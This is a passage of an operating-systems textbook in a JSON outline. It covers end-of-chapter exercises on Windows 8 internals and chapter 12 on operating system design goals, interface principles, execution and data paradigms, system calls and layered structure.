a\r\nmutex) is marked to use a notification event instead of a synchronization event to\r\nannounce that the lock has been released. Why would this be bad? How much would\r\nthe answer depend on lock hold times, the length of quantum, and whether the system\r\nwas a multiprocessor?\r\n30. To support POSIX, the native NtCreateProcess API supports duplicating a process in\r\norder to support fork. In UNIX fork is shortly followed by an exec most of the time.\r\nOne example where this was used historically was in the Berkeley dump(8S) program\r\nwhich would backup disks to magnetic tape. Fork was used as a way of checkpointing\r\nthe dump program so it could be restarted if there was an error with the tape device.\nCHAP. 11 PROBLEMS 979\r\nGive an example of how Windows might do something similar using NtCreateProcess.\r\n(Hint: Consider processes that host DLLs to implement functionality provided by a\r\nthird party).\r\n31. A file has the following mapping. Give the MFT run entries.\r\nOffset 0 1 2 3 4 5 6 7 8 9 10\r\nDisk address 50 51 52 22 24 25 26 53 54 - 60\r\n32. Consider the MFT record of Fig. 11-41. Suppose that the file grew and a 10th block\r\nwas assigned to the end of the file. The number of this block is 66. What would the\r\nMFT record look like now?\r\n33. In Fig. 11-44(b), the first two runs are each of length 8 blocks. Is it just an accident\r\nthat they are equal, or does this have to do with the way compression works? Explain\r\nyour answer.\r\n34. Suppose that you wanted to build Windows Lite. Which of the fields of Fig. 11-45\r\ncould be removed without weakening the security of the system?\r\n35. The mitigation strategy for improving security despite the continuing presence of vul\u0002nerabilities has been very successful. Modern attacks are very sophisticated, often re\u0002quiring the presence of multiple vulnerabilities to build a reliable exploit. One of the\r\nvulnerabilities that is usually required is an information leak. Explain how an infor\u0002mation leak can be used to defeat address-space randomization in order to launch an\r\nattack based on return-oriented programming.\r\n36. An extension model used by many programs (Web browsers, Office, COM servers)\r\ninvolves hosting DLLs to hook and extend their underlying functionality. Is this a rea\u0002sonable model for an RPC-based service to use as long as it is careful to impersonate\r\nclients before loading the DLL? Why not?\r\n37. When running on a NUMA machine, whenever the Windows memory manager needs\r\nto allocate a physical page to handle a page fault it attempts to use a page from the\r\nNUMA node for the current thread’s ideal processor. Why? What if the thread is cur\u0002rently running on a different processor?\r\n38. Give a couple of examples where an application might be able to recover easily from a\r\nbackup based on a volume shadow copy rather the state of the disk after a system\r\ncrash.\r\n39. In Sec. 11.10, providing new memory to the process heap was mentioned as one of the\r\nscenarios that require a supply of zeroed pages in order to satisfy security re\u0002quirements. Give one or more other examples of virtual memory operations that re\u0002quire zeroed pages.\r\n40. Windows contains a hypervisor which allows multiple operating systems to run simul\u0002taneously. This is available on clients, but is far more important in cloud computing.\r\nWhen a security update is applied to a guest operating system, it is not much different\r\nthan patching a server. Howev er, when a security update is applied to the root operat\u0002ing system, this can be a big problem for the users of cloud computing. What is the\r\nnature of the problem? What can be done about it?\n980 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\n41. The regedit command can be used to export part or all of the registry to a text file\r\nunder all current versions of Windows. Save the registry several times during a work\r\nsession and see what changes. If you have access to a Windows computer on which\r\nyou can install software or hardware, find out what changes when a program or device\r\nis added or removed.\r\n42. Write a UNIX program that simulates writing an NTFS file with multiple streams. It\r\nshould accept a list of one or more files as arguments and write an output file that con\u0002tains one stream with the attributes of all arguments and additional streams with the\r\ncontents of each of the arguments. Now write a second program for reporting on the\r\nattributes and streams and extracting all the components.\n12\r\nOPERATING SYSTEM DESIGN\r\nIn the past 11 chapters, we have covered a lot of ground and taken a look at\r\nmany concepts and examples relating to operating systems. But studying existing\r\noperating systems is different from designing a new one. In this chapter we will\r\ntake a quick look at some of the issues and trade-offs that operating systems de\u0002signers have to consider when designing and implementing a new system.\r\nThere is a certain amount of folklore about what is good and what is bad float\u0002ing around in the operating systems community, but surprisingly little has been\r\nwritten down. Probably the most important book is Fred Brooks’ classic The Myth\u0002ical Man Month in which he relates his experiences in designing and implementing\r\nIBM’s OS/360. The 20th anniversary edition revises some of that material and\r\nadds four new chapters (Brooks, 1995).\r\nThree classic papers on operating system design are ‘‘Hints for Computer Sys\u0002tem Design’’ (Lampson, 1984), ‘‘On Building Systems That Will Fail’’ (Corbato´,\r\n1991), and ‘‘End-to-End Arguments in System Design’’ (Saltzer et al., 1984). Like\r\nBrooks’ book, all three papers have survived the years extremely well; most of\r\ntheir insights are still as valid now as when they were first published.\r\nThis chapter draws upon these sources as well as on personal experience as de\u0002signer or codesigner of two operating systems: Amoeba (Tanenbaum et al., 1990)\r\nand MINIX (Tanenbaum and Woodhull, 2006). Since no consensus exists among\r\noperating system designers about the best way to design an operating system, this\r\nchapter will thus be more personal, speculative, and undoubtedly more controver\u0002sial than the previous ones.\r\n981"
      }
    }
  },
  "12 OPERATING SYSTEM DESIGN": {
    "page": 1012,
    "children": {
      "12.1 THE NATURE OF THE DESIGN PROBLEM": {
        "page": 1013,
        "children": {
          "12.1.1 Goals": {
            "page": 1013,
            "content": "12.1.1 Goals\r\nIn order to design a successful operating system, the designers must have a\r\nclear idea of what they want. Lack of a goal makes it very hard to make subsequent\r\ndecisions. To make this point clearer, it is instructive to take a look at two pro\u0002gramming languages, PL/I and C. PL/I was designed by IBM in the 1960s because\r\nit was a nuisance to have to support both FORTRAN and COBOL, and embarrass\u0002ing to have academics yapping in the background that Algol was better than both\r\nof them. So a committee was set up to produce a language that would be all things\r\nto all people: PL/I. It had a little bit of FORTRAN, a little bit of COBOL, and a\r\nlittle bit of Algol. It failed because it lacked any unifying vision. It was simply a\r\ncollection of features at war with one another, and too cumbersome to be compiled\r\nefficiently, to boot.\r\nNow consider C. It was designed by one person (Dennis Ritchie) for one pur\u0002pose (system programming). It was a huge success, in no small part because\r\nRitchie knew what he wanted and did not want. As a result, it is still in widespread\r\nuse more than three decades after its appearance. Having a clear vision of what\r\nyou want is crucial.\r\nWhat do operating system designers want? It obviously varies from system to\r\nsystem, being different for embedded systems than for server systems. However,\r\nfor general-purpose operating systems four main items come to mind:\r\n1. Define abstractions.\r\n2. Provide primitive operations.\r\n3. Ensure isolation.\r\n4. Manage the hardware.\r\nEach of these items will be discussed below.\r\nThe most important, but probably hardest task of an operating system is to\r\ndefine the right abstractions. Some of them, such as processes, address spaces, and\r\nfiles, have been around so long that they may seem obvious. Others, such as\r\nthreads, are newer, and are less mature. For example, if a multithreaded process\r\nthat has one thread blocked waiting for keyboard input forks, is there a thread in\r\nthe new process also waiting for keyboard input? Other abstractions relate to syn\u0002chronization, signals, the memory model, modeling of I/O, and many other areas.\r\nEach of the abstractions can be instantiated in the form of concrete data struc\u0002tures. Users can create processes, files, pipes, and more. The primitive operations\nSEC. 12.1 THE NATURE OF THE DESIGN PROBLEM 983\r\nmanipulate these data structures. For example, users can read and write files. The\r\nprimitive operations are implemented in the form of system calls. From the user’s\r\npoint of view, the heart of the operating system is formed by the abstractions and\r\nthe operations on them available via the system calls.\r\nSince on some computers multiple users can be logged into a computer at the\r\nsame time, the operating system needs to provide mechanisms to keep them sepa\u0002rated. One user may not interfere with another. The process concept is widely used\r\nto group resources together for protection purposes. Files and other data structures\r\ngenerally are protected as well. Another place where separation is crucial is in vir\u0002tualization: the hypervisor must ensure that the virtual machines keep out of each\r\nother’s hair. Making sure each user can perform only authorized operations on\r\nauthorized data is a key goal of system design. However, users also want to share\r\ndata and resources, so the isolation has to be selective and under user control. This\r\nmakes it much harder. The email program should not be able to clobber the Web\r\nbrowser. Even when there is only a single user, different processes need to be iso\u0002lated. Some systems, like Android, will start each process that belongs to the same\r\nuser with a different user ID, to protect the processes from each other.\r\nClosely related to this point is the need to isolate failures. If some part of the\r\nsystem goes down, most commonly a user process, it should not be able to take the\r\nrest of the system down with it. The system design should make sure that the vari\u0002ous parts are well isolated from one another. Ideally, parts of the operating system\r\nshould also be isolated from one another to allow independent failures. Going\r\nev en further, maybe the operating system should be fault tolerant and self healing?\r\nFinally, the operating system has to manage the hardware. In particular, it has\r\nto take care of all the low-level chips, such as interrupt controllers and bus con\u0002trollers. It also has to provide a framework for allowing device drivers to manage\r\nthe larger I/O devices, such as disks, printers, and the display."
          },
          "12.1.2 Why Is It Hard to Design an Operating System?": {
            "page": 1014,
            "content": "12.1.2 Why Is It Hard to Design an Operating System?\r\nMoore’s Law says that computer hardware improves by a factor of 100 every\r\ndecade. Nobody has a law saying that operating systems improve by a factor of\r\n100 every decade. Or even get better at all. In fact, a case can be made that some\r\nof them are worse in key respects (such as reliability) than UNIX Version 7 was\r\nback in the 1970s.\r\nWhy? Inertia and the desire for backward compatibility often get much of the\r\nblame, and the failure to adhere to good design principles is also a culprit. But\r\nthere is more to it. Operating systems are fundamentally different in certain ways\r\nfrom small application programs you can download for $49. Let us look at eight of\r\nthe issues that make designing an operating system much harder than designing an\r\napplication program.\r\nFirst, operating systems have become extremely large programs. No one per\u0002son can sit down at a PC and dash off a serious operating system in a few months.\n984 OPERATING SYSTEM DESIGN CHAP. 12\r\nOr even a few years. All current versions of UNIX contain millions of lines of\r\ncode; Linux has hit 15 million, for example. Windows 8 is probably in the range\r\nof 50–100 million lines of code, depending on what you count (Vista was 70 mil\u0002lion, but changes since then have both added code and removed it). No one person\r\ncan understand a million lines of code, let alone 50 or 100 million. When you have\r\na product that none of the designers can hope to fully understand, it should be no\r\nsurprise that the results are often far from optimal.\r\nOperating systems are not the most complex systems around. Aircraft carriers\r\nare far more complicated, for example, but they partition into isolated subsystems\r\nmuch better. The people designing the toilets on a aircraft carrier do not have to\r\nworry about the radar system. The two subsystems do not interact much. There are\r\nno known cases of a clogged toilet on an aircraft carrier causing the ship to start\r\nfiring missiles. In an operating system, the file system often interacts with the\r\nmemory system in unexpected and unforeseen ways.\r\nSecond, operating systems have to deal with concurrency. There are multiple\r\nusers and multiple I/O devices all active at once. Managing concurrency is inher\u0002ently much harder than managing a single sequential activity. Race conditions and\r\ndeadlocks are just two of the problems that come up.\r\nThird, operating systems have to deal with potentially hostile users—users who\r\nwant to interfere with system operation or do things that they are forbidden from\r\ndoing, such as stealing another user’s files. The operating system needs to take\r\nmeasures to prevent these users from behaving improperly. Word-processing pro\u0002grams and photo editors do not have this problem.\r\nFourth, despite the fact that not all users trust each other, many users do want\r\nto share some of their information and resources with selected other users. The op\u0002erating system has to make this possible, but in such a way that malicious users\r\ncannot interfere. Again, application programs do not face anything like this chal\u0002lenge.\r\nFifth, operating systems live for a very long time. UNIX has been around for\r\n40 years. Windows has been around for about 30 years and shows no signs of van\u0002ishing. Consequently, the designers have to think about how hardware and applica\u0002tions may change in the distant future and how they should prepare for it. Systems\r\nthat are locked too closely into one particular vision of the world usually die off.\r\nSixth, operating system designers really do not have a good idea of how their\r\nsystems will be used, so they need to provide for considerable generality. Neither\r\nUNIX nor Windows was designed with a Web browser or streaming HD video in\r\nmind, yet many computers running these systems do little else. Nobody tells a ship\r\ndesigner to build a ship without specifying whether they want a fishing vessel, a\r\ncruise ship, or a battleship. And even fewer change their minds after the product\r\nhas arrived.\r\nSeventh, modern operating systems are generally designed to be portable,\r\nmeaning they hav e to run on multiple hardware platforms. They also have to sup\u0002port thousands of I/O devices, all of which are independently designed with no\nSEC. 12.1 THE NATURE OF THE DESIGN PROBLEM 985\r\nregard to one another. An example of where this diversity causes problems is the\r\nneed for an operating system to run on both little-endian and big-endian machines.\r\nA second example was seen constantly under MS-DOS when users attempted to\r\ninstall, say, a sound card and a modem that used the same I/O ports or interrupt re\u0002quest lines. Few programs other than operating systems have to deal with sorting\r\nout problems caused by conflicting pieces of hardware.\r\nEighth, and last in our list, is the frequent need to be backward compatible\r\nwith some previous operating system. That system may have restrictions on word\r\nlengths, file names, or other aspects that the designers now reg ard as obsolete, but\r\nare stuck with. It is like converting a factory to produce next year’s cars instead of\r\nthis year’s cars, but while continuing to produce this year’s cars at full capacity."
          }
        }
      },
      "12.2 INTERFACE DESIGN": {
        "page": 1016,
        "children": {
          "12.2.1 Guiding Principles": {
            "page": 1016,
            "content": "12.2.1 Guiding Principles\r\nAre there any principles that can guide interface design? We believe there are.\r\nBriefly summarized, they are simplicity, completeness, and the ability to be imple\u0002mented efficiently.\r\nPrinciple 1: Simplicity\r\nA simple interface is easier to understand and implement in a bug-free way. All\r\nsystem designers should memorize this famous quote from the pioneer French avi\u0002ator and writer, Antoine de St. Exupe´ry:\r\nPerfection is reached not when there is no longer anything to add, but\r\nwhen there is no longer anything to take away.\n986 OPERATING SYSTEM DESIGN CHAP. 12\r\nIf you want to get really picky, he didn’t say that. He said:\r\nIl semble que la perfection soit atteinte non quand il n’y a plus rien a`\r\najouter, mais quand il n’y a plus rien a` retrancher.\r\nBut you get the idea. Memorize it either way.\r\nThis principle says that less is better than more, at least in the operating system\r\nitself. Another way to say this is the KISS principle: Keep It Simple, Stupid.\r\nPrinciple 2: Completeness\r\nOf course, the interface must make it possible to do everything that the users\r\nneed to do, that is, it must be complete. This brings us to another famous quote,\r\nthis one from Albert Einstein:\r\nEverything should be as simple as possible, but no simpler.\r\nIn other words, the operating system should do exactly what is needed of it and no\r\nmore. If users need to store data, it must provide some mechanism for storing data.\r\nIf users need to communicate with each other, the operating system has to provide\r\na communication mechanism, and so on. In his 1991 Turing Award lecture, Fer\u0002nando Corbato´, one of the designers of CTSS and MULTICS, combined the con\u0002cepts of simplicity and completeness and said:\r\nFirst, it is important to emphasize the value of simplicity and elegance, for\r\ncomplexity has a way of compounding difficulties and as we have seen,\r\ncreating mistakes. My definition of elegance is the achievement of a given\r\nfunctionality with a minimum of mechanism and a maximum of clarity.\r\nThe key idea here is minimum of mechanism. In other words, every feature, func\u0002tion, and system call should carry its own weight. It should do one thing and do it\r\nwell. When a member of the design team proposes extending a system call or add\u0002ing some new feature, the others should ask whether something awful would hap\u0002pen if it were left out. If the answer is: ‘‘No, but somebody might find this feature\r\nuseful some day,’’ put it in a user-level library, not in the operating system, even if\r\nit is slower that way. Not every feature has to be faster than a speeding bullet. The\r\ngoal is to preserve what Corbato´ called minimum of mechanism.\r\nLet us briefly consider two examples from our own experience: MINIX (Tan\u0002enbaum and Woodhull, 2006) and Amoeba (Tanenbaum et al., 1990). For all\r\nintents and purposes, MINIX until very recently had only three kernel calls: send,\r\nreceive, and sendrec. The system is structured as a collection of processes, with\r\nthe memory manager, the file system, and each device driver being a separate\r\nschedulable process. To a first approximation, all the kernel does is schedule proc\u0002esses and handle message passing between them. Consequently, only two system\r\ncalls were needed: send, to send a message, and receive, to receive one. The third\r\ncall, sendrec, is simply an optimization for efficiency reasons to allow a message\nSEC. 12.2 INTERFACE DESIGN 987\r\nto be sent and the reply to be requested with only one kernel trap. Everything else\r\nis done by requesting some other process (e.g., the file-system process or the disk\r\ndriver) to do the work. The most recent version of MINIX added two additional\r\ncalls, both for asynchronous communication. The senda call sends an asynchro\u0002nous message. The kernel will attempt to deliver the message, but the application\r\ndoes not wait for this; it just keeps running. Similarly, the system uses the notify\r\ncall to deliver short notifications. For instance, the kernel can notify a device driver\r\nin user space that something happened—much like an interrupt. There is no mes\u0002sage associated with a notification. When the kernel delivers a notification to proc\u0002ess, all it does is flip a bit in a per-process bitmap indicating that something hap\u0002pened. Because it is so simple, it can be fast and the kernel does not need to worry\r\nabout what message to deliver if the process receives the same notification twice. It\r\nis worth observing that while the number of calls is still very small, it is growing.\r\nBloat is inevitable. Resistance is futile.\r\nOf course, these are just the kernel calls. Running a POSIX compliant system\r\non top of it, requires implementing a lot of POSIX system calls. But the beauty of\r\nit is that they all map on just a tiny set of kernel calls. With a system that is (still)\r\nso simple, there is a chance we may even get it right.\r\nAmoeba is even simpler. It has only one system call: perform remote proce\u0002dure call. This call sends a message and waits for a reply. It is essentially the\r\nsame as MINIX’ sendrec. Everything else is built on this one call. Whether or not\r\nsynchronous communication is the way to go is another matter, one that we will re\u0002turn to in Sec. 12.3.\r\nPrinciple 3: Efficiency\r\nThe third guideline is efficiency of implementation. If a feature or system call\r\ncannot be implemented efficiently, it is probably not worth having. It should also\r\nbe intuitively obvious to the programmer about how much a system call costs. For\r\nexample, UNIX programmers expect the lseek system call to be cheaper than the\r\nread system call because the former just changes a pointer in memory while the\r\nlatter performs disk I/O. If the intuitive costs are wrong, programmers will write\r\ninefficient programs."
          },
          "12.2.2 Paradigms": {
            "page": 1018,
            "content": "12.2.2 Paradigms\r\nOnce the goals have been established, the design can begin. A good starting\r\nplace is thinking about how the customers will view the system. One of the most\r\nimportant issues is how to make all the features of the system hang together well\r\nand present what is often called architectural coherence. In this regard, it is im\u0002portant to distinguish two kinds of operating system ‘‘customers.’’ On the one\r\nhand, there are the users, who interact with application programs; on the other are\r\nthe programmers, who write them. The former mostly deal with the GUI; the latter\n988 OPERATING SYSTEM DESIGN CHAP. 12\r\nmostly deal with the system call interface. If the intention is to have a single GUI\r\nthat pervades the complete system, as in the Macintosh, the design should begin\r\nthere. If, on the other hand, the intention is to support many possible GUIs, such\r\nas in UNIX, the system-call interface should be designed first. Doing the GUI first\r\nis essentially a top-down design. The issues are what features it will have, how the\r\nuser will interact with it, and how the system should be designed to support it. For\r\nexample, if most programs display icons on the screen and then wait for the user to\r\nclick on one of them, this suggests an event-driven model for the GUI and proba\u0002bly also for the operating system. On the other hand, if the screen is mostly full of\r\ntext windows, then a model in which processes read from the keyboard is probably\r\nbetter.\r\nDoing the system-call interface first is a bottom-up design. Here the issues are\r\nwhat kinds of features programmers in general need. Actually, not many special\r\nfeatures are needed to support a GUI. For example, the UNIX windowing system,\r\nX, is just a big C program that does reads and wr ites on the keyboard, mouse, and\r\nscreen. X was dev eloped long after UNIX and did not require many changes to the\r\noperating system to get it to work. This experience validated the fact that UNIX\r\nwas sufficiently complete.\r\nUser-Interface Paradigms\r\nFor both the GUI-level interface and the system-call interface, the most impor\u0002tant aspect is having a good paradigm (sometimes called a metaphor) to provide a\r\nway of looking at the interface. Many GUIs for desktop machines use the WIMP\r\nparadigm that we discussed in Chap. 5. This paradigm uses point-and-click, point\u0002and-double-click, dragging, and other idioms throughout the interface to provide\r\nan architectural coherence to the whole. Often there are additional requirements for\r\nprograms, such as having a menu bar with FILE, EDIT, and other entries, each of\r\nwhich has certain well-known menu items. In this way, users who know one pro\u0002gram can quickly learn another.\r\nHowever, the WIMP user interface is not the only one possible. Tablets, smart\u0002phones and some laptops use touch screens to allow users to interact more directly\r\nand more intuitively with the device. Some palmtop computers use a stylized\r\nhandwriting interface. Dedicated multimedia devices may use a VCR-like inter\u0002face. And of course, voice input has a completely different paradigm. What is im\u0002portant is not so much the paradigm chosen, but the fact that there is a single over\u0002riding paradigm that unifies the entire user interface.\r\nWhatever paradigm is chosen, it is important that all application programs use\r\nit. Consequently, the system designers need to provide libraries and tool kits to ap\u0002plication developers that give them access to procedures that produce the uniform\r\nlook-and-feel. Without tools, application developers will all do something dif\u0002ferent. User interface design is important, but it is not the subject of this book, so\r\nwe will now drop back down to the subject of the operating system interface.\nSEC. 12.2 INTERFACE DESIGN 989\r\nExecution Paradigms\r\nArchitectural coherence is important at the user level, but equally important at\r\nthe system-call interface level. It is often useful to distinguish between the execu\u0002tion paradigm and the data paradigm, so we will do both, starting with the former.\r\nTw o execution paradigms are widespread: algorithmic and event driven. The\r\nalgorithmic paradigm is based on the idea that a program is started to perform\r\nsome function that it knows in advance or gets from its parameters. That function\r\nmight be to compile a program, do the payroll, or fly an airplane to San Francisco.\r\nThe basic logic is hardwired into the code, with the program making system calls\r\nfrom time to time to get user input, obtain operating system services, and so on.\r\nThis approach is outlined in Fig. 12-1(a).\r\nmain( ) main( )\r\n{ {\r\nint ... ; mess t msg;\r\ninit( ); init( );\r\ndo something( ); while (get message(&msg)) {\r\nread(...); switch (msg.type) {\r\ndo something else( ); case 1: ... ;\r\nwr ite(...); case 2: ... ;\r\nkeep going( ); case 3: ... ;\r\nexit(0); }\r\n} }\r\n}\r\n(a) (b)\r\nFigure 12-1. (a) Algorithmic code. (b) Event-driven code.\r\nThe other execution paradigm is the ev ent-driven paradigm of Fig. 12-1(b).\r\nHere the program performs some kind of initialization, for example by displaying a\r\ncertain screen, and then waits for the operating system to tell it about the first\r\nev ent. The event is often a key being struck or a mouse movement. This design is\r\nuseful for highly interactive programs.\r\nEach of these ways of doing business engenders its own programming style.\r\nIn the algorithmic paradigm, algorithms are central and the operating system is\r\nregarded as a service provider. In the event-driven paradigm, the operating system\r\nalso provides services, but this role is overshadowed by its role as a coordinator of\r\nuser activities and a generator of events that are consumed by processes.\r\nData Paradigms\r\nThe execution paradigm is not the only one exported by the operating system.\r\nAn equally important one is the data paradigm. The key question here is how sys\u0002tem structures and devices are presented to the programmer. In early FORTRAN\n990 OPERATING SYSTEM DESIGN CHAP. 12\r\nbatch systems, everything was modeled as a sequential magnetic tape. Card decks\r\nread in were treated as input tapes, card decks to be punched were treated as output\r\ntapes, and output for the printer was treated as an output tape. Disk files were also\r\ntreated as tapes. Random access to a file was possible only by rewinding the tape\r\ncorresponding to the file and reading it again.\r\nThe mapping was done using job control cards like these:\r\nMOUNT(TAPE08, REEL781)\r\nRUN(INPUT, MYDATA, OUTPUT, PUNCH, TAPE08)\r\nThe first card instructed the operator to go get tape reel 781 from the tape rack and\r\nmount it on tape drive 8. The second card instructed the operating system to run\r\nthe just-compiled FORTRAN program, mapping INPUT (meaning the card reader)\r\nto logical tape 1, disk file MYDATA to logical tape 2, the printer (called OUTPUT)\r\nto logical tape 3, the card punch (called PUNCH) to logical tape 4. and physical\r\ntape drive 8 to logical tape 5.\r\nFORTRAN had a well-defined syntax for reading and writing logical tapes.\r\nBy reading from logical tape 1, the program got card input. By writing to logical\r\ntape 3, output would later appear on the printer. By reading from logical tape 5,\r\ntape reel 781 could be read in, and so on. Note that the tape idea was just a para\u0002digm to integrate the card reader, printer, punch, disk files, and tapes. In this ex\u0002ample, only logical tape 5 was a physical tape; the rest were ordinary (spooled)\r\ndisk files. It was a primitive paradigm, but it was a start in the right direction.\r\nLater came UNIX, which goes much further using the model of ‘‘everything is\r\na file.’’ Using this paradigm, all I/O devices are treated as files and can be opened\r\nand manipulated as ordinary files. The C statements\r\nfd1 = open(\"file1\", O RDWR);\r\nfd2 = open(\"/dev/tty\", O RDWR)’\r\nopen a true disk file and the user’s terminal (keyboard + display). Subsequent\r\nstatements can use fd1 and fd2 to read and write them, respectively. From that\r\npoint on, there is no difference between accessing the file and accessing the termi\u0002nal, except that seeks on the terminal are not allowed.\r\nNot only does UNIX unify files and I/O devices, but it also allows other proc\u0002esses to be accessed over pipes as files. Furthermore, when mapped files are sup\u0002ported, a process can get at its own virtual memory as though it were a file. Finally,\r\nin versions of UNIX that support the /proc file system, the C statement\r\nfd3 = open(\"/proc/501\", O RDWR);\r\nallows the process to (try to) access process 501’s memory for reading and writing\r\nusing file descriptor fd3, something useful for, say, a debugger.\r\nOf course, just because someone says that everything is a file does not mean it\r\nis true—for everything. For instance, UNIX network sockets may resemble files\r\nsomewhat, but they hav e their own, fairly different, socket API. Another operating\nSEC. 12.2 INTERFACE DESIGN 991\r\nsystem, Plan 9 from Bell Labs, has not compromised and does not provide spe\u0002cialized interfaces for network sockets and such. As a result, the Plan 9 design is\r\narguably cleaner.\r\nWindows tries to make everything look like an object. Once a process has ac\u0002quired a valid handle to a file, process, semaphore, mailbox, or other kernel object,\r\nit can perform operations on it. This paradigm is even more general than that of\r\nUNIX and much more general than that of FORTRAN.\r\nUnifying paradigms occur in other contexts as well. One of them is worth\r\nmentioning here: the Web. The paradigm behind the Web is that cyberspace is full\r\nof documents, each of which has a URL. By typing in a URL or clicking on an\r\nentry backed by a URL, you get the document. In reality, many ‘‘documents’’ are\r\nnot documents at all, but are generated by a program or shell script when a request\r\ncomes in. For example, when a user asks an online store for a list of CDs by a par\u0002ticular artist, the document is generated on-the-fly by a program; it certainly did\r\nnot exist before the query was made.\r\nWe hav e now seen four cases: namely, everything is a tape, file, object, or doc\u0002ument. In all four cases, the intention is to unify data, devices, and other resources\r\nto make them easier to deal with. Every operating system should have such a uni\u0002fying data paradigm."
          },
          "12.2.3 The System-Call Interface": {
            "page": 1022,
            "content": "12.2.3 The System-Call Interface\r\nIf one believes in Corbato´’s dictum of minimal mechanism, then the operating\r\nsystem should provide as few system calls as it can get away with, and each one\r\nshould be as simple as possible (but no simpler). A unifying data paradigm can\r\nplay a major role in helping here. For example, if files, processes, I/O devices, and\r\nmuch more all look like files or objects, then they can all be read with a single read\r\nsystem call. Otherwise it may be necessary to have separate calls for read file,\r\nread proc, and read tty, among others.\r\nSometimes, system calls may need several variants, but it is often good prac\u0002tice to have one call that handles the general case, with different library procedures\r\nto hide this fact from the programmers. For example, UNIX has a system call for\r\noverlaying a process’ virtual address space, exec. The most general call is\r\nexec(name, argp, envp);\r\nwhich loads the executable file name and gives it arguments pointed to by argp and\r\nenvironment variables pointed to by envp. Sometimes it is convenient to list the\r\narguments explicitly, so the library contains procedures that are called as follows:\r\nexecl(name, arg0, arg1, ..., argn, 0);\r\nexecle(name, arg0, arg1, ..., argn, envp);\r\nAll these procedures do is stick the arguments in an array and then call exec to do\r\nthe real work. This arrangement is the best of both worlds: a single straightforward\n992 OPERATING SYSTEM DESIGN CHAP. 12\r\nsystem call keeps the operating system simple, yet the programmer gets the con\u0002venience of various ways to call exec.\r\nOf course, trying to have one call to handle every possible case can easily get\r\nout of hand. In UNIX creating a process requires two calls: fork followed by exec.\r\nThe former has no parameters; the latter has three. In contrast, the WinAPI call for\r\ncreating a process, CreateProcess, has 10 parameters, one of which is a pointer to\r\na structure with an additional 18 parameters.\r\nA long time ago, someone should have asked whether something awful would\r\nhappen if some of these had been omitted. The truthful answer would have been in\r\nsome cases programmers might have to do more work to achieve a particular ef\u0002fect, but the net result would have been a simpler, smaller, and more reliable oper\u0002ating system. Of course, the person proposing the 10 + 18 parameter version might\r\nhave added: ‘‘But users like all these features.’’ The rejoinder might have been they\r\nlike systems that use little memory and never crash even more. Trade-offs between\r\nmore functionality at the cost of more memory are at least visible and can be given\r\na price tag (since the price of memory is known). However, it is hard to estimate\r\nthe additional crashes per year some feature will add and whether the users would\r\nmake the same choice if they knew the hidden price. This effect can be summa\u0002rized in Tanenbaum’s first law of software:\r\nAdding more code adds more bugs.\r\nAdding more features adds more code and thus adds more bugs. Programmers who\r\nbelieve adding new features does not add new bugs either are new to computers or\r\nbelieve the tooth fairy is out there watching over them.\r\nSimplicity is not the only issue that comes out when designing system calls.\r\nAn important consideration is Lampson’s (1984) slogan:\r\nDon’t hide power.\r\nIf the hardware has an extremely efficient way of doing something, it should be\r\nexposed to the programmers in a simple way and not buried inside some other\r\nabstraction. The purpose of abstractions is to hide undesirable properties, not hide\r\ndesirable ones. For example, suppose the hardware has a special way to move large\r\nbitmaps around the screen (i.e., the video RAM) at high speed. It would be justi\u0002fied to have a new system call to get at this mechanism, rather than just provide\r\nways to read video RAM into main memory and write it back again. The new call\r\nshould just move bits and nothing else. If a system call is fast, users can always\r\nbuild more convenient interfaces on top of it. If it is slow, nobody will use it.\r\nAnother design issue is connection-oriented vs. connectionless calls. The Win\u0002dows and UNIX system calls for reading a file are connection-oriented, like using\r\nthe telephone. First you open a file, then you read it, finally you close it. Some re\u0002mote file-access protocols are also connection-oriented. For example, to use FTP,\r\nthe user first logs in to the remote machine, reads the files, and then logs out.\nSEC. 12.2 INTERFACE DESIGN 993\r\nOn the other hand, some remote file-access protocols are connectionless. The\r\nWeb protocol (HTTP) is connectionless. To read a Web page you just ask for it;\r\nthere is no advance setup required (a TCP connection is required, but this is at a\r\nlower level of protocol. HTTP itself is connectionless).\r\nThe trade-off between any connection-oriented mechanism and a con\u0002nectionless one is the additional work required to set up the mechanism (e.g., open\r\nthe file), and the gain from not having to do it on (possibly many) subsequent calls.\r\nFor file I/O on a single machine, where the setup cost is low, probably the standard\r\nway (first open, then use) is the best way. For remote file systems, a case can be\r\nmade both ways.\r\nAnother issue relating to the system-call interface is its visibility. The list of\r\nPOSIX-mandated system calls is easy to find. All UNIX systems support these, as\r\nwell as a small number of other calls, but the complete list is always public. In\r\ncontrast, Microsoft has never made the list of Windows system calls public. Instead\r\nthe WinAPI and other APIs have been made public, but these contain vast numbers\r\nof library calls (over 10,000) but only a small number are true system calls. The\r\nargument for making all the system calls public is that it lets programmers know\r\nwhat is cheap (functions performed in user space) and what is expensive (kernel\r\ncalls). The argument for not making them public is that it gives the implementers\r\nthe flexibility of changing the actual underlying system calls to make them better\r\nwithout breaking user programs. As we saw in Sec. 9.7.7, the original designers\r\nsimply got it wrong with the access system call, but now we are stuck with it."
          }
        }
      },
      "12.3 IMPLEMENTATION": {
        "page": 1024,
        "children": {
          "12.3.1 System Structure": {
            "page": 1024,
            "content": "12.3.1 System Structure\r\nProbably the first decision the implementers have to make is what the system\r\nstructure should be. We examined the main possibilities in Sec. 1.7, but will\r\nreview them here. An unstructured monolithic design is not a good idea, except\r\nmaybe for a tiny operating system in, say, a toaster, but even there it is arguable.\r\nLayered Systems\r\nA reasonable approach that has been well established over the years is a lay\u0002ered system. Dijkstra’s THE system (Fig. 1-25) was the first layered operating sys\u0002tem. UNIX and Windows 8 also have a layered structure, but the layering in both\n994 OPERATING SYSTEM DESIGN CHAP. 12\r\nof them is more a way of trying to describe the system than a real guiding principle\r\nthat was used in building the system.\r\nFor a new system, designers choosing to go this route should first very careful\u0002ly choose the layers and define the functionality of each one. The bottom layer\r\nshould always try to hide the worst idiosyncracies of the hardware, as the HAL\r\ndoes in Fig. 11-4. Probably the next layer should handle interrupts, context switch\u0002ing, and the MMU, so above this level the code is mostly machine independent.\r\nAbove this, different designers will have different tastes (and biases). One possi\u0002bility is to have layer 3 manage threads, including scheduling and interthread syn\u0002chronization, as shown in Fig. 12-2. The idea here is that starting at layer 4 we\r\nhave proper threads that are scheduled normally and synchronize using a standard\r\nmechanism (e.g., mutexes).\r\nInterrupt handling, context switching, MMU\r\nHide the low-level hardware\r\nVirtual memory\r\nThreads, thread scheduling, thread synchronization\r\n1\r\n2\r\n3\r\n4\r\n5\r\nDriver 1 Driver n 